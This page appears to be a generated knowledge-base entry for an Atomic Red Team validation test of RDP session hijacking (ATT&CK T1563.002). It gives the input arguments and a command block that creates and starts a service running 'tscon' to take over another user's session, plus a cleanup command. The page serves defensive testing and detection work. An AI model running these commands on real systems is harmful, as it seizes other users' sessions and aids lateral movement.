---
atomic_guid: "a37ac520-b911-458e-8aed-c5f1576d9f46"
title: "RDP hijacking"
framework: "atomic"
generated: "true"
attack_technique_id: "T1563.002"
attack_technique_name: "Remote Service Session Hijacking: RDP Hijacking"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1563.002/T1563.002.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "a37ac520-b911-458e-8aed-c5f1576d9f46"
  - "RDP hijacking"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# RDP hijacking

[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization

## Metadata

- Atomic GUID: a37ac520-b911-458e-8aed-c5f1576d9f46
- Technique: T1563.002: Remote Service Session Hijacking: RDP Hijacking
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1563.002/T1563.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1563-remote_service_session_hijacking|T1563.002]]

## Input Arguments

### Destination_ID

- description: Connect the session of another user to a different session
- type: string
- default: rdp-tcp#55

### Session_ID

- description: The ID of the session to which you want to connect
- type: string
- default: 1337

## Executor

- elevation_required: True
- name: command_prompt

### Command

```commandprompt
query user
sc.exe create sesshijack binpath= "cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}"
net start sesshijack
```

### Cleanup

```commandprompt
sc.exe delete sesshijack >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1563.002/T1563.002.yaml)
